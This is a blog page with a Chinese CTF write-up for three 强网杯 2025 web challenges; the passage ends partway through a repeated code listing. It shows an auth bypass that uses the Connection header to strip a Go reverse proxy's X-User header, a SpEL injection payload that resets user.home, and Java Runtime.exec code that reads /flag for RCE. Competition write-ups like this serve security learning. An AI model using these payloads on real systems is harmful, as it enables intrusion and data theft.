<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>强网杯 2025 WEB Writeup | w8nn9z Blog</title><meta name=keywords content><meta name=description content="强网杯 2025 WEB Writeup - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/ctf/qwb-2025-web-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/ctf/qwb-2025-web-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/ctf/qwb-2025-web-writeup/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="强网杯 2025 WEB Writeup"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-22T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-21T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="强网杯 2025 WEB Writeup"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"CTF","item":"https://blog.w8nn9z.top/posts/ctf/"},{"@type":"ListItem","position":3,"name":"强网杯 2025 WEB Writeup","item":"https://blog.w8nn9z.top/posts/ctf/qwb-2025-web-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"强网杯 2025 WEB Writeup","name":"强网杯 2025 WEB Writeup","description":"","keywords":[],"articleBody":"SecretVault 反向代理 authorizer main.go：\npackage main import ( \"crypto/rand\" \"encoding/hex\" \"fmt\" \"log\" \"net/http\" \"net/http/httputil\" \"strings\" \"time\" \"github.com/golang-jwt/jwt/v5\" \"github.com/gorilla/mux\" ) var ( SecretKey = hex.EncodeToString(RandomBytes(32)) ) type AuthClaims struct { jwt.RegisteredClaims UID string `json:\"uid\"` } func RandomBytes(length int) []byte { b := make([]byte, length) if _, err := rand.Read(b); err != nil { return nil } return b } func SignToken(uid string) (string, error) { t := jwt.NewWithClaims(jwt.SigningMethodHS256, AuthClaims{ UID: uid, RegisteredClaims: jwt.RegisteredClaims{ Issuer: \"Authorizer\", Subject: uid, ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)), IssuedAt: jwt.NewNumericDate(time.Now()), NotBefore: jwt.NewNumericDate(time.Now()), }, }) tokenString, err := t.SignedString([]byte(SecretKey)) if err != nil { return \"\", err } return tokenString, nil } func GetUIDFromRequest(r *http.Request) string { authHeader := r.Header.Get(\"Authorization\") if authHeader == \"\" { cookie, err := r.Cookie(\"token\") if err == nil { authHeader = \"Bearer \" + cookie.Value } else { return \"\" } } if len(authHeader) \u003c= 7 || !strings.HasPrefix(authHeader, \"Bearer \") { return \"\" } tokenString := strings.TrimSpace(authHeader[7:]) if tokenString == \"\" { return \"\" } token, err := jwt.ParseWithClaims(tokenString, \u0026AuthClaims{}, func(token *jwt.Token) (interface{}, error) { if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { return nil, fmt.Errorf(\"unexpected signing method: %v\", token.Header[\"alg\"]) } return []byte(SecretKey), nil }) if err != nil { log.Printf(\"failed to parse token: %v\", err) return \"\" } claims, ok := token.Claims.(*AuthClaims) if !ok || !token.Valid { log.Printf(\"invalid token claims\") return \"\" } return claims.UID } func main() { authorizer := \u0026httputil.ReverseProxy{Director: func(req *http.Request) { req.URL.Scheme = \"http\" req.URL.Host = \"127.0.0.1:5000\" uid := GetUIDFromRequest(req) log.Printf(\"Request UID: %s, URL: %s\", uid, req.URL.String()) req.Header.Del(\"Authorization\") req.Header.Del(\"X-User\") req.Header.Del(\"X-Forwarded-For\") req.Header.Del(\"Cookie\") if uid == \"\" { req.Header.Set(\"X-User\", \"anonymous\") } else { req.Header.Set(\"X-User\", uid) } }} signRouter := mux.NewRouter() signRouter.HandleFunc(\"/sign\", func(w http.ResponseWriter, r *http.Request) { if !strings.HasPrefix(r.RemoteAddr, \"127.0.0.1:\") { http.Error(w, \"Forbidden\", http.StatusForbidden) } uid := r.URL.Query().Get(\"uid\") token, err := SignToken(uid) if err != nil { log.Printf(\"Failed to sign token: %v\", err) http.Error(w, \"Failed to generate token\", http.StatusInternalServerError) return } w.Write([]byte(token)) }).Methods(\"GET\") log.Println(\"Sign service is running at 127.0.0.1:4444\") go func() { if err := http.ListenAndServe(\"127.0.0.1:4444\", signRouter); err != nil { log.Fatal(err) } }() log.Println(\"Authorizer middleware service is running at :5555\") if err := http.ListenAndServe(\":5555\", authorizer); err != nil { log.Fatal(err) } } web服务 vault python app.py：\nimport base64 import os import secrets import sys from datetime import datetime from functools import wraps import requests from cryptography.fernet import Fernet from flask import ( Flask, flash, g, jsonify, make_response, redirect, render_template, request, url_for, ) from flask_sqlalchemy import SQLAlchemy from sqlalchemy.exc import IntegrityError import hashlib db = SQLAlchemy() class User(db.Model): id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(80), unique=True, nullable=False) password_hash = db.Column(db.String(128), nullable=False) salt = db.Column(db.String(64), nullable=False) created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False) vault_entries = db.relationship('VaultEntry', backref='user', lazy=True, cascade='all, delete-orphan') class VaultEntry(db.Model): id = db.Column(db.Integer, primary_key=True) user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False) label = db.Column(db.String(120), nullable=False) login = db.Column(db.String(120), nullable=False) password_encrypted = db.Column(db.Text, nullable=False) notes = db.Column(db.Text) created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False) def hash_password(password: str, salt: bytes) -\u003e str: data = salt + password.encode('utf-8') for _ in range(50): data = hashlib.sha256(data).digest() return base64.b64encode(data).decode('utf-8') def verify_password(password: str, salt_b64: str, digest: str) -\u003e bool: salt = base64.b64decode(salt_b64.encode('utf-8')) return hash_password(password, salt) == digest def generate_salt() -\u003e bytes: return secrets.token_bytes(16) def create_app() -\u003e Flask: app = Flask(__name__) app.config['SECRET_KEY'] = secrets.token_hex(32) app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///vault.db') app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False app.config['SIGN_SERVER'] = os.getenv('SIGN_SERVER', 'http://127.0.0.1:4444/sign') fernet_key = os.getenv('FERNET_KEY') if not fernet_key: raise RuntimeError('Missing FERNET_KEY environment variable. Generate one with `python -c \"from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())\"`.') app.config['FERNET_KEY'] = fernet_key db.init_app(app) fernet = Fernet(app.config['FERNET_KEY']) with app.app_context(): db.create_all() if not User.query.first(): salt = secrets.token_bytes(16) password = secrets.token_bytes(32).hex() password_hash = hash_password(password, salt) user = User( id=0, username='admin', password_hash=password_hash, salt=base64.b64encode(salt).decode('utf-8'), ) db.session.add(user) db.session.commit() flag = open('/flag').read().strip() flagEntry = VaultEntry( user_id=user.id, label='flag', login='flag', password_encrypted=fernet.encrypt(flag.encode('utf-8')).decode('utf-8'), notes='This is the flag entry.', ) db.session.add(flagEntry) db.session.commit() def login_required(view_func): @wraps(view_func) def wrapped(*args, **kwargs): uid = request.headers.get('X-User', '0') print(uid) if uid == 'anonymous': flash('Please sign in first.', 'warning') return redirect(url_for('login')) try: uid_int = int(uid) except (TypeError, ValueError): flash('Invalid session. Please sign in again.', 'warning') return redirect(url_for('login')) user = User.query.filter_by(id=uid_int).first() if not user: flash('User not found. Please sign in again.', 'warning') return redirect(url_for('login')) g.current_user = user return view_func(*args, **kwargs) return wrapped @app.route('/') def index(): uid = request.headers.get('X-User', '0') if not uid or uid == 'anonymous': return redirect(url_for('login')) return redirect(url_for('dashboard')) @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form.get('username', '').strip() password = request.form.get('password', '') confirm_password = request.form.get('confirm_password', '') if not username or not password: flash('Username and password are required.', 'danger') return render_template('register.html') if password != confirm_password: flash('Passwords do not match.', 'danger') return render_template('register.html') salt = generate_salt() password_hash = hash_password(password, salt) user = User( username=username, password_hash=password_hash, salt=base64.b64encode(salt).decode('utf-8'), ) db.session.add(user) try: db.session.commit() except IntegrityError: db.session.rollback() flash('Username already exists. Please choose another.', 'warning') return render_template('register.html') flash('Registration successful. Please sign in.', 'success') return redirect(url_for('login')) return render_template('register.html') @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form.get('username', '').strip() password = request.form.get('password', '') user = User.query.filter_by(username=username).first() if not user or not verify_password(password, user.salt, user.password_hash): flash('Invalid username or password.', 'danger') return render_template('login.html') r = requests.get(app.config['SIGN_SERVER'], params={'uid': user.id}, timeout=5) if r.status_code != 200: flash('Unable to reach the authentication server. Please try again later.', 'danger') return render_template('login.html') token = r.text.strip() response = make_response(redirect(url_for('dashboard'))) response.set_cookie( 'token', token, httponly=True, secure=app.config.get('SESSION_COOKIE_SECURE', False), samesite='Lax', max_age=12 * 3600, ) return response return render_template('login.html') @app.route('/logout') def logout(): response = make_response(redirect(url_for('login'))) response.delete_cookie('token') flash('Signed out.', 'info') return response @app.route('/dashboard') @login_required def dashboard(): user = g.current_user entries = [ { 'id': entry.id, 'label': entry.label, 'login': entry.login, 'password': fernet.decrypt(entry.password_encrypted.encode('utf-8')).decode('utf-8'), 'notes': entry.notes, 'created_at': entry.created_at, } for entry in user.vault_entries ] return render_template('dashboard.html', username=user.username, entries=entries) @app.route('/passwords/new', methods=['POST']) @login_required def create_password(): user = g.current_user label = request.form.get('label', '').strip() login_value = request.form.get('login', '').strip() password_plain = request.form.get('password', '').strip() notes = request.form.get('notes', '').strip() or None if not label or not login_value or not password_plain: flash('Service name, login, and password are required.', 'danger') return redirect(url_for('dashboard')) encrypted_password = fernet.encrypt(password_plain.encode('utf-8')).decode('utf-8') entry = VaultEntry( user_id=user.id, label=label, login=login_value, password_encrypted=encrypted_password, notes=notes, ) db.session.add(entry) db.session.commit() flash('Password entry saved.', 'success') return redirect(url_for('dashboard')) @app.route('/passwords/', methods=['DELETE']) @login_required def delete_password(entry_id: int): user = g.current_user entry = VaultEntry.query.filter_by(id=entry_id, user_id=user.id).first() if not entry: return jsonify({'success': False, 'message': 'Entry not found'}), 404 db.session.delete(entry) db.session.commit() return jsonify({'success': True}) return app if __name__ == '__main__': flask_app = create_app() flask_app.run(host='127.0.0.1', port=5000, debug=False) 获取flag就要伪造admin身份登录，直接获取密码行不通 entrypoint.sh：\nstart_vault() { cd /app/vault \u0026\u0026 FERNET_KEY=$(python -c \"from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())\") su vault -s /bin/sh -c \"python3 app.py\" \u0026 } 注意到鉴权是通过 X-User 进行的：\ndef login_required(view_func): @wraps(view_func) def wrapped(*args, **kwargs): uid = request.headers.get('X-User', '0') print(uid) if uid == 'anonymous': flash('Please sign in first.', 'warning') return redirect(url_for('login')) try: uid_int = int(uid) except (TypeError, ValueError): flash('Invalid session. Please sign in again.', 'warning') return redirect(url_for('login')) user = User.query.filter_by(id=uid_int).first() if not user: flash('User not found. Please sign in again.', 'warning') return redirect(url_for('login')) g.current_user = user return view_func(*args, **kwargs) return wrapped @app.route('/') def index(): uid = request.headers.get('X-User', '0') if not uid or uid == 'anonymous': return redirect(url_for('login')) return redirect(url_for('dashboard')) 因此只需要设置 X-User 为0或者能够不带 X-User 访问路由/就能伪造admin用户登录\n根据 main.go 中的 GetUIDFromRequest， uid 是通过 jwt 获取的，而 jwt 签名的 SecretKey 又是随机生成的：\nvar ( SecretKey = hex.EncodeToString(RandomBytes(32)) ) 无法直接伪造 jwt，直接设置 X-User 为0也不行，在 main.go 的反向代理中会重新设置用户信息：\nauthorizer := \u0026httputil.ReverseProxy{Director: func(req *http.Request) { req.URL.Scheme = \"http\" req.URL.Host = \"127.0.0.1:5000\" uid := GetUIDFromRequest(req) log.Printf(\"Request UID: %s, URL: %s\", uid, req.URL.String()) req.Header.Del(\"Authorization\") req.Header.Del(\"X-User\") req.Header.Del(\"X-Forwarded-For\") req.Header.Del(\"Cookie\") if uid == \"\" { req.Header.Set(\"X-User\", \"anonymous\") } else { req.Header.Set(\"X-User\", uid) } }} 唯一能打通的可能就是不带 X-User 访问，reverseproxy.go：\nfunc (p *ReverseProxy) ServeHTTP(rw http.ResponseWriter, req *http.Request) { ... if p.Director != nil { p.Director(outreq) if outreq.Form != nil { outreq.URL.RawQuery = cleanQueryParams(outreq.URL.RawQuery) } } outreq.Close = false reqUpType := upgradeType(outreq.Header) if !ascii.IsPrint(reqUpType) { p.getErrorHandler()(rw, req, fmt.Errorf(\"client tried to switch to invalid protocol %q\", reqUpType)) return } removeHopByHopHeaders(outreq.Header) ... } ... // removeHopByHopHeaders removes hop-by-hop headers. func removeHopByHopHeaders(h http.Header) { // RFC 7230, section 6.1: Remove headers listed in the \"Connection\" header. for _, f := range h[\"Connection\"] { for sf := range strings.SplitSeq(f, \",\") { if sf = textproto.TrimString(sf); sf != \"\" { h.Del(sf) } } } // RFC 2616, section 13.5.1: Remove a set of known hop-by-hop headers. // This behavior is superseded by the RFC 7230 Connection header, but // preserve it for backwards compatibility. for _, f := range hopHeaders { h.Del(f) } } 根据 ReverseProxy 的这份源码 ServeHTTP-\u003eDirector-\u003eremoveHopByHopHeaders，只需要将想要删除的 header 放入 Connection 中即可：\n再跟随重定向到 /dashboard：\nbbjv GatewayController：\n@RestController /* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/controller/GatewayController.class */ public class GatewayController { private final EvaluationService evaluationService; public GatewayController(EvaluationService evaluationService) { this.evaluationService = evaluationService; } @GetMapping({\"/check\"}) public String checkRule(@RequestParam String rule) throws FileNotFoundException { String result = this.evaluationService.evaluate(rule); File flagFile = new File(System.getProperty(\"user.home\"), \"flag.txt\"); if (flagFile.exists()) { try { BufferedReader br = new BufferedReader(new FileReader(flagFile)); try { String content = br.readLine(); result = result + \"\n�� Flag: \" + content; br.close(); } finally { } } catch (IOException e) { throw new RuntimeException(e); } } return result; } } EvaluationService：\n@Service /* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/service/EvaluationService.class */ public class EvaluationService { private final ExpressionParser parser = new SpelExpressionParser(); private final EvaluationContext context; public EvaluationService(EvaluationContext context) { this.context = context; } public String evaluate(String expression) { try { Object result = this.parser.parseExpression(expression, new TemplateParserContext()).getValue(this.context); return \"Result: \" + String.valueOf(result); } catch (Exception e) { return \"Error: \" + e.getMessage(); } } } Dockerfile：\nFROM docker.io/openjdk:21-jdk-slim\rWORKDIR /app\rCOPY app.jar /app/app.jar\rCOPY flag.txt /tmp/flag.txt\rEXPOSE 8080\rCMD [\"java\", \"-jar\", \"app.jar\"] home目录下是没有flag.txt的，可以通过SpEL注入将user.home改为/tmp，payload：\n%23%7B%23systemProperties%5B%27user.home%27%5D%3D%27%2Ftmp%27%7D yamcs 存在命令执行的功能，输出到Sunsensor_Beta里：\n尝试执行whoami，报错：\nCannot compile expression ' java.util.Scanner s = new java.util.Scanner( Runtime.getRuntime().exec(\"whoami\").getInputStream()); out0.setStringValue(s.next().trim()); ': Line 2, Column 71: Thrown exception of type \"java.io.IOException\" is neither caught by a \"try...catch\" block nor declared in the \"throws\" clause of the declaring function 代码里加上try-cacth即可RCE：\ntry { java.util.Scanner s = new java.util.Scanner( Runtime.getRuntime().exec(\"cat /flag\").getInputStream()); out0.setStringValue(s.next().trim()); } catch (Exception e) { out0.setStringValue(\"ERROR\"); } ","wordCount":"2010","inLanguage":"en","datePublished":"2025-10-22T00:00:00Z","dateModified":"2025-12-21T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/ctf/qwb-2025-web-writeup/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">强网杯 2025 WEB Writeup</h1><div class=post-meta><span title='2025-10-22 00:00:00 +0000 UTC'>October 22, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#secretvault aria-label=SecretVault>SecretVault</a></li><li><a href=#bbjv aria-label=bbjv>bbjv</a></li><li><a href=#yamcs aria-label=yamcs>yamcs</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=secretvault>SecretVault<a hidden class=anchor aria-hidden=true href=#secretvault>#</a></h2><p>反向代理 authorizer main.go：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;crypto/rand&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;encoding/hex&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;fmt&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;log&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;net/http&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;net/http/httputil&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;strings&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;time&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/golang-jwt/jwt/v5&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/gorilla/mux&#34;</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> (
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>SecretKey</span> = <span style=color:#a6e22e>hex</span>.<span style=color:#a6e22e>EncodeToString</span>(<span style=color:#a6e22e>RandomBytes</span>(<span style=color:#ae81ff>32</span>))
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>type</span> <span style=color:#a6e22e>AuthClaims</span> <span style=color:#66d9ef>struct</span> {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>RegisteredClaims</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>UID</span> <span style=color:#66d9ef>string</span> <span style=color:#e6db74>`json:&#34;uid&#34;`</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>RandomBytes</span>(<span style=color:#a6e22e>length</span> <span style=color:#66d9ef>int</span>) []<span style=color:#66d9ef>byte</span> {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>b</span> <span style=color:#f92672>:=</span> make([]<span style=color:#66d9ef>byte</span>, <span style=color:#a6e22e>length</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>rand</span>.<span style=color:#a6e22e>Read</span>(<span style=color:#a6e22e>b</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>nil</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>b</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>SignToken</span>(<span style=color:#a6e22e>uid</span> <span style=color:#66d9ef>string</span>) (<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>error</span>) {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>t</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>NewWithClaims</span>(<span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>SigningMethodHS256</span>, <span style=color:#a6e22e>AuthClaims</span>{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>UID</span>: <span style=color:#a6e22e>uid</span>,
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>RegisteredClaims</span>: <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>RegisteredClaims</span>{
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Issuer</span>:    <span style=color:#e6db74>&#34;Authorizer&#34;</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Subject</span>:   <span style=color:#a6e22e>uid</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>ExpiresAt</span>: <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>NewNumericDate</span>(<span style=color:#a6e22e>time</span>.<span style=color:#a6e22e>Now</span>().<span style=color:#a6e22e>Add</span>(<span style=color:#a6e22e>time</span>.<span style=color:#a6e22e>Hour</span>)),
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>IssuedAt</span>:  <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>NewNumericDate</span>(<span style=color:#a6e22e>time</span>.<span style=color:#a6e22e>Now</span>()),
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>NotBefore</span>: <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>NewNumericDate</span>(<span style=color:#a6e22e>time</span>.<span style=color:#a6e22e>Now</span>()),
</span></span><span style=display:flex><span>		},
</span></span><span style=display:flex><span>	})
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>tokenString</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>t</span>.<span style=color:#a6e22e>SignedString</span>([]byte(<span style=color:#a6e22e>SecretKey</span>))
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>tokenString</span>, <span style=color:#66d9ef>nil</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>GetUIDFromRequest</span>(<span style=color:#a6e22e>r</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) <span style=color:#66d9ef>string</span> {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>authHeader</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Get</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>authHeader</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>cookie</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Cookie</span>(<span style=color:#e6db74>&#34;token&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>authHeader</span> = <span style=color:#e6db74>&#34;Bearer &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>cookie</span>.<span style=color:#a6e22e>Value</span>
</span></span><span style=display:flex><span>		} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> len(<span style=color:#a6e22e>authHeader</span>) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>||</span> !<span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>HasPrefix</span>(<span style=color:#a6e22e>authHeader</span>, <span style=color:#e6db74>&#34;Bearer &#34;</span>) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>	}
